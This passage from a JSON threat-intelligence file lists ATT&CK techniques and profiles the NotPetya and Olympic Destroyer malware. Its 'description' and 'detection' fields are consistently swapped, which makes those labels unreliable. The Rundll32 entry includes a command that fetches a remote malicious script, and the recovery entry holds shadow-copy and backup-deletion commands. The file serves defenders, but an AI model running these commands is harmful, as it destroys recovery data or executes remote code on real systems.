                "description": "Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.",
                "detection": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1518.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Security Software Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.",
                "detection": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1218.011",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Rundll32",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
                "detection": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. \n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://www.example.com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1053.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Scheduled Task",
                "chain_phase": "execution",
                "description": "Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
                "detection": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At (Windows)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1529",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Shutdown/Reboot",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006.",
                "detection": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer. Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1486",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Encrypted for Impact",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.\n\nIn some cases, monitoring for unusual kernel driver installation activity can aid in detection.\n\nIn cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies.",
                "detection": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted. In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.\n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "IaaS"
                ]
            }
        },
        {
            "id": "T1210",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation of Remote Services",
                "chain_phase": "lateral-movement",
                "description": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
                "detection": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services. \n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1047",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Management Instrumentation",
                "chain_phase": "execution",
                "description": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)",
                "detection": "Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB)  and Remote Procedure Call Service (RPCS)  for remote access. RPCS operates over port 135. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1036",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Masquerading",
                "chain_phase": "defense-evasion",
                "description": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE”.",
                "detection": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T0866",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation of Remote Services",
                "chain_phase": "lateral-movement-ics",
                "description": [],
                "detection": "Adversaries may exploit a software vulnerability to take advantage of a programming error in a program, service, or within the operating system software or kernel itself to enable remote service abuse. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system. \n\nICS asset owners and operators have been affected by ransomware (or disruptive malware masquerading as ransomware) migrating from enterprise IT to ICS environments: WannaCry, NotPetya, and BadRabbit. In each of these cases, self-propagating (“wormable”) malware initially infected IT networks, but through exploit (particularly the SMBv1-targeting MS17-010 vulnerability) spread to industrial networks, producing significant impacts.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Data Historian",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0822",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "External Remote Services",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may leverage external remote services as a point of initial access into your network. These services allow users to connect to internal network resources from external locations. Examples are VPNs, Citrix, and other access mechanisms. Remote service gateways often manage connections and credential authentication for these services. External remote services allow administration of a control system from outside the system. Often, vendors and internal engineering groups have access to external remote services to control system networks via the corporate network. In some cases, this access is enabled directly from the internet. While remote access enables ease of maintenance when a control system is in a remote area, compromise of remote access solutions is a liability. The adversary may use these services to gain access to and execute attacks against a control system network. Access to valid accounts is often a requirement. As they look for an entry point into the control system network, adversaries may begin searching for existing point‐to‐point VPN implementations at trusted third party networks or through remote support employee connections where split tunneling is enabled. In the Maroochy Attack, the adversary was able to gain remote computer access to the system over radio.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Input/Output Server"
                ]
            }
        },
        {
            "id": "T0828",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of Productivity and Revenue",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may cause loss of productivity and revenue through disruption and even damage to the availability and integrity of control system operations, devices, and related processes. This technique may manifest as a direct effect of an ICS-targeting attack or tangentially, due to an IT-targeting attack against non-segregated environments. In some cases, this may result from the postponement and disruption of ICS operations and production as part of a remediation effort. Operations may be brought to a halt and effectively stopped in an effort to contain and properly remove malware or due to the <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">Loss of Safety</span></span></span></span>.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0867",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Lateral Tool Transfer",
                "chain_phase": "lateral-movement-ics",
                "description": [],
                "detection": "Adversaries may transfer tools or other files from one system to another to stage adversary tools or other files over the course of an operation.  Copying of files may also be performed laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares. \n\nIn control systems environments, malware may use SMB and other file sharing protocols to move laterally through industrial networks.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Control Server",
                    "Data Historian"
                ]
            }
        },
        {
            "id": "S0368",
            "type": "tool",
            "attributes": {
                "name": "NotPetya",
                "aliases": [
                    "ExPetr",
                    "Diskcoder.C",
                    "GoldenEye",
                    "Petrwrap",
                    "Nyetya"
                ],
                "labels": [
                    "malware"
                ],
                "description": "NotPetya is malware that was used by Sandworm Team in a worldwide attack starting on June 27, 2017. While NotPetya appears as a form of ransomware, its main purpose was to destroy data and disk structures on compromised systems; the attackers never intended to make the encrypted data recoverable. As such, NotPetya may be more appropriately thought of as a form of wiper malware. NotPetya contains worm-like features to spread itself across a computer network using the SMBv1 exploits EternalBlue and EternalRomance.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1078.003": "Local Accounts",
                    "T1569.002": "Service Execution",
                    "T1518.001": "Security Software Discovery",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1218.011": "Rundll32",
                    "T1053.005": "Scheduled Task",
                    "T1529": "System Shutdown/Reboot",
                    "T1486": "Data Encrypted for Impact",
                    "T1210": "Exploitation of Remote Services",
                    "T1083": "File and Directory Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1036": "Masquerading",
                    "T0866": "Exploitation of Remote Services",
                    "T0822": "External Remote Services",
                    "T0828": "Loss of Productivity and Revenue",
                    "T0867": "Lateral Tool Transfer"
                }
            },
            "val": 18
        },
        {
            "id": "T1490",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Inhibit System Recovery",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.\n\nMonitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage</code>).",
                "detection": "Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* Windows Management Instrumentation can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1489",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Service Stop",
                "chain_phase": "impact",
                "description": "Monitor processes and command-line arguments to see if critical processes are terminated or stop running.\n\nMonitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.\n\nAlterations to the service binary path or the service startup type changed to disabled may be suspicious.\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)",
                "detection": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible . In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1485",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Destruction",
                "chain_phase": "impact",
                "description": "Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\\Windows\\System32\\</code>.\n\nIn cloud environments, the occurrence of anomalous high-volume deletion events, such as the <code>DeleteDBCluster</code> and <code>DeleteGlobalCluster</code> events in AWS, or a high quantity of data deletion events, such as <code>DeleteBucket</code>, within a short period of time may indicate suspicious activity.",
                "detection": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares..\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1018",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote System Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net. Adversaries may also use local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. \n\nSpecific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0365",
            "type": "tool",
            "attributes": {
                "name": "Olympic Destroyer",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Olympic Destroyer is malware that was used by Sandworm Team against the 2018 Winter Olympics, held in Pyeongchang, South Korea. The main purpose of the malware was to render infected computer systems inoperable. The malware leverages various native Windows utilities and API calls to carry out its destructive tasks. Olympic Destroyer has worm-like features to spread itself across a computer network in order to maximize its destructive impact.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1570": "Lateral Tool Transfer",
                    "T1569.002": "Service Execution",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1529": "System Shutdown/Reboot",
                    "T1490": "Inhibit System Recovery",
                    "T1489": "Service Stop",
                    "T1485": "Data Destruction",
                    "T1135": "Network Share Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "T1074.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Data Staging",
                "chain_phase": "collection",
                "description": "Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1059.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Visual Basic",
                "chain_phase": "execution",
                "description": "Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.\n\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.",
                "detection": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1560",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Archive Collected Data",
                "chain_phase": "collection",
                "description": "Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)",
                "detection": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1036.004",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Masquerade Task or Service",
                "chain_phase": "defense-evasion",
                "description": "Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1543.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Service",
                "chain_phase": "persistence",
                "description": "Monitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
